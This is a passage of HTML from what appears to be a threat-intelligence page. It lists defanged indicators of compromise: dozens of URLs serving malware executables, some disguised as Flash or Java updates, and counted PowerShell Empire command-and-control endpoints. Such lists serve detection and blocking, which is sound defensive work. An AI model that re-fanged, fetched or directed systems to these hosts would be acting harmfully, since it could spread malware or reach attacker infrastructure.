class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//185[.]45.193.169/update.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-60"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//31[.]184.234.74/crypted/1080qw.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-61"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//aircraftpns[.]com/_layout/images/sysmonitor.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-62"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//allbestunlockerpro[.]com/flash.player.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-63"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//anonfile[.]xyz/f/3d0a4fb54941eb10214f3c1a5fb3ed99.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-64"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//anonfile[.]xyz/f/921e1b3c55168c2632318b6d22a7bfe6.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-65"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//brokelimiteds[.]in/wp-admin/css/upload/ken1.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-66"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//cajos[.]in/0x/1.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-67"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//danhviet[.]com.vn/app/p2.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-68"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//danhviet[.]com.vn/z/v/doc.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-69"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//daratad[.]5gbfree.com/uses/word.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-70"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//ddl2[.]data.hu/get/0/9589621/k000.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-71"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//ddl3[.]data.hu/get/0/9535517/yhaooo.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-72"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//ddl3[.]data.hu/get/0/9551162/ske.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-73"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//ddl7[.]data.hu/get/0/9552103/PFIfdp.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-74"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//getlohnumceders[.]honor.es/kimt.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-75"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//hinrichsen[.]de/assets/win1/win1.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-76"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//icbg-iq[.]com/Scripts/kinetics/categories/3rmax.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-77"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//khoun-legal[.]com/download/ctob.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-78"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//kiana[.]com/flowplayer/aquafresh.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-79"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//labid[.]com.my/power/powex.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-80"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//matkalv[.]5gbfree.com/calab/calafile.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-81"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//matkalv[.]5gbfree.com/noza/odeee.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-82"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//matkalv[.]5gbfree.com/owee/owe.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-83"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//matkalv[.]5gbfree.com/vosa/doc.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-84"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//nikil[.]tk/b1/bo_001.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-85"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//nikil[.]tk/k1/ik_001.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-86"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//sukem[.]zapto.org/word.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-87"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//trolda[.]5gbfree.com/fosee/doc.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-88"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//worldnit[.]com/aba.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-89"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//worldnit[.]com/aba.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-90"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//worldnit[.]com/abacoss.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-91"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//worldnit[.]com/abuchi.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-92"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//worldnit[.]com/com.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-93"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//worldnit[.]com/com.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-94"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//worldnit[.]com/compu.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-95"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//worldnit[.]com/comu.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-96"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//worldnit[.]com/firefox32.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-97"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//worldnit[.]com/igbo.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-98"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//worldnit[.]com/immo.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-99"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//worldnit[.]com/kele.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-100"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//worldnit[.]com/kelle.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-101"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//worldnit[.]com/kells.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-102"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//worldnit[.]com/kuku.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-103"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//worldnit[.]com/nigga.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-104"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//worldnit[.]com/nigga.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-105"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//worldnit[.]com/office.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-106"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//worldnit[.]com/pony.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-107"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//worldnit[.]com/seccrypt.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-108"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//worldnit[.]com/sect.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-109"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//www[.]athensheartcenter.com/crm/cgi-bin/lnm.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-110"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//www[.]bryonz.com/emotions/files/lnwe.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-111"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//www[.]fluidsystems.ml/P1/Pa_001.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-112"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//www[.]macwizinfo.com/updates/eter.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-113"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//www[.]matrimonioadvisor.it/pariglia.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-114"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//www[.]pelicanlinetravels.com/images/xvcbkty.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-115"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//www[.]telemedia.co.za/wp-content/ozone/slim.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-116"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//www[.]wealthandhealthops.com/modules/mod_easybloglist/kntgszu.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-117"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxp</span><span class="crayon-o">:</span><span class="crayon-c">//www[.]wvhmedicine.ru/1/P2.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-118"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//1fichier[.]com/?hfshjhm0yf</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-119"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//1fichier[.]com/?v8w3g736hj</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-120"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//a[.]pomf.cat/jfyywz.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-121"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//a[.]pomf.cat/klckcp.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-122"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//a[.]pomf.cat/wopkwj.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-123"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//a[.]pomf.cat/yhggkj.exe</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-124"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//dryversdocumentgritsettings[.]com/javaupdat3s2016.exe</span></div><div class="crayon-line" id="crayon-60a9b96a2c9b1144488533-125"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//megadl[.]fr/?b5r5bstqd1</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c9b1144488533-126"><span class="crayon-cn">1</span><span class="crayon-h">	</span><span class="crayon-v">hxxps</span><span class="crayon-o">:</span><span class="crayon-c">//srv-file1[.]gofile.io/download/SJLKaG/84.200.65.20/wscript.exe</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0042 seconds] -->
<p><strong>PowerShell Empire</strong></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c9bc261839621" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
39	hxxp://198[.]18.133.111:8081/index.asp
8	hxxp://95[.]211.139.88:80/index.asp
5	hxxps://46[.]101.90.248:443/index.asp
5	hxxp://microsoft-update7[.]myvnc.com:443/index.asp
5	hxxp://145[.]131.7.190:8080/index.asp
3	hxxps://52[.]39.227.108:443/index.asp
3	hxxp://vanesa[.]ddns.net:443/index.asp
3	hxxp://polygon[.]1dn0.xyz/index.asp
3	hxxp://159[.]203.18.172:8080/index.asp
2	hxxps://dsecti0n[.]gotdns.ch:8080/index.asp
2	hxxps://69[.]20.66.229:9443/index.asp
2	hxxps://50[.]3.74.72:8080/index.asp
2	hxxps://205[.]232.71.92:443/index.asp
2	hxxp://hop[.]wellsfargolegal.com/index.asp
2	hxxp://ciagov[.]gotdns.ch:8080/index.asp
2	hxxp://chgvaswks045[.]efgz.efg.corp:888/index.asp
2	hxxp://ads[.]mygoogle-analytics.com:80/index.asp
2	hxxp://84[.]200.84.185:443/index.asp
2	hxxp://84[.]14.146.74:443/index.asp
2	hxxp://66[.]11.115.25:8080/index.asp
2	hxxp://64[.]137.176.174:12345/index.asp
2	hxxp://52[.]28.242.165:8080/index.asp
2	hxxp://52[.]19.131.17:80/index.asp
2	hxxp://23[.]239.12.15:8080/index.asp
2	hxxp://212[.]99.114.202:443/count.php?user=
2	hxxp://188[.]68.59.11:8081/index.asp
2	hxxp://185[.]117.72.45:8080/index.asp
2	hxxp://163[.]172.175.132:8089/index.asp
2	hxxp://159[.]203.89.248:80/index.asp
2	hxxp://14[.]144.144.66:8081/index.asp
2	hxxp://103[.]238.227.201:7788/index.asp
1	hxxps://www[.]enterprizehost.com:9443/index.asp
1	hxxps://sixeight[.]av-update.com:443/index.asp
1	hxxps://remote-01[.]web-access.us/index.asp
1	hxxps://msauth[.]net/index.asp
1	hxxps://metrowifi[.]no-ip.org:8443/index.asp
1	hxxps://megalon[.]trustwave.com:443/index.asp
1	hxxps://mail[.]microsoft-invites.com/index.asp
1	hxxps://logexpert[.]eu/index.asp
1	hxxps://host-101[.]ipsec.io/index.asp
1	hxxps://93[.]176.84.45:443/index.asp
1	hxxps://93[.]176.84.34:443/index.asp
1	hxxps://66[.]60.224.82:443/index.asp
1	hxxps://66[.]192.70.39:443/index.asp
1	hxxps://66[.]192.70.38:80/index.asp
1	hxxps://52[.]86.125.177:443/index.asp
1	hxxps://50[.]251.57.67:8080/index.asp
1	hxxps://46[.]101.203.156:443/index.asp
1	hxxps://46[.]101.185.146:8080/index.asp
1	hxxps://45[.]63.109.205:8443/index.asp
1	hxxps://172[.]30.18.11:443/index.asp
1	hxxps://146[.]148.58.157:8088/index.asp
1	hxxps://108[.]61.211.36/index.asp
1	hxxps://107[.]170.132.24:443/index.asp
1	hxxps://104[.]131.182.177:443/index.asp
1	hxxp://sparta34[.]no-ip.biz:443/index.asp
1	hxxp://securetx[.]ddns.net:3333/index.asp
1	hxxp://pie32[.]mooo.com:8080/index.asp
1	hxxp://m[.]jdirving.email:21/index.asp
1	hxxp://kooks[.]ddns.net:4444:4444/index.asp
1	hxxp://kernel32[.]ddns.net:8080/index.asp
1	hxxp://home[.]rzepka.se/index.asp
1	hxxp://192.ho4x.com:80/index.asp
1	hxxp://ec2-35-167-185-55[.]us-west-2.compute.amazonaws.com:443/index.asp
1	hxxp://amazonsdeliveries[.]com/index.asp
1	hxxp://ahyses[.]ddns.net:4444/index.asp
1	hxxp://98[.]103.103.170:80/index.asp
1	hxxp://98[.]103.103.168:80/index.asp
1	hxxp://93[.]187.43.200:80/index.asp
1	hxxp://84[.]200.2.13:8080/index.asp
1	hxxp://78[.]229.133.134:80/index.asp
1	hxxp://68[.]66.9.76/index.asp
1	hxxp://52[.]36.245.145:8080/index.asp
1	hxxp://52[.]28.250.99:8080/index.asp
1	hxxp://52[.]196.119.113:80/index.asp
1	hxxp://50[.]251.57.67:8080/index.asp
1	hxxp://47[.]88.17.109:80/index.asp
1	hxxp://46[.]246.87.205/index.asp
1	hxxp://41[.]230.232.65:5552:5552/index.asp
1	hxxp://24[.]111.1.135:22/index.asp
1	hxxp://23[.]116.90.9:80/index.asp
1	hxxp://222[.]230.139.166:80/index.asp
1	hxxp://197[.]85.191.186:80/index.asp
1	hxxp://197[.]85.191.186:443/index.asp
1	hxxp://192[.]241.129.69:443/index.asp
1	hxxp://191[.]101.31.118:8081/index.asp
1	hxxp://187[.]228.46.144:8888/index.asp
1	hxxp://187[.]177.151.80:12345/index.asp
1	hxxp://166[.]78.124.106:80/index.asp
1	hxxp://163[.]172.151.90:80/index.asp
1	hxxp://149[.]56.178.124:8080/index.asp
1	hxxp://139[.]59.12.202:80/index.asp
1	hxxp://138[.]121.170.12:500/index.asp
1	hxxp://138[.]121.170.12:3138/index.asp
1	hxxp://138[.]121.170.12:3137/index.asp
1	hxxp://138[.]121.170.12:3136/index.asp
1	hxxp://138[.]121.170.12:3135/index.asp
1	hxxp://138[.]121.170.12:3133/index.asp
1	hxxp://138[.]121.170.12:3031/index.asp
1	hxxp://137[.]117.188.120:443/index.asp
1	hxxp://11[.]79.40.53:80/index.asp
1	hxxp://108[.]61.217.22:443/index.asp
1	hxxp://104[.]233.102.23:8080/index.asp
1	hxxp://104[.]145.225.3:8081/index.asp
1	hxxp://104[.]131.154.119:8080/index.asp
1	hxxp://104[.]130.51.215:80/index.asp
1	hxxp://100[.]100.100.100:8080/index.asp</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-2">2</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-4">4</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-6">6</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-8">8</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-10">10</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-12">12</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-14">14</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-16">16</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-18">18</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-20">20</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-22">22</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-24">24</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-26">26</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-28">28</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-30">30</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-32">32</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-34">34</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-36">36</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-38">38</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-40">40</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-42">42</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-44">44</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-46">46</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-48">48</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-50">50</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-51">51</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-52">52</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-53">53</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-54">54</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-55">55</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-56">56</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-57">57</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-58">58</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-59">59</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-60">60</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-61">61</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-62">62</div><div class="crayon-num" data-line="crayon-60a9b96a2c9bc261839621-63">63</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c9bc261839621-64">64</div><div 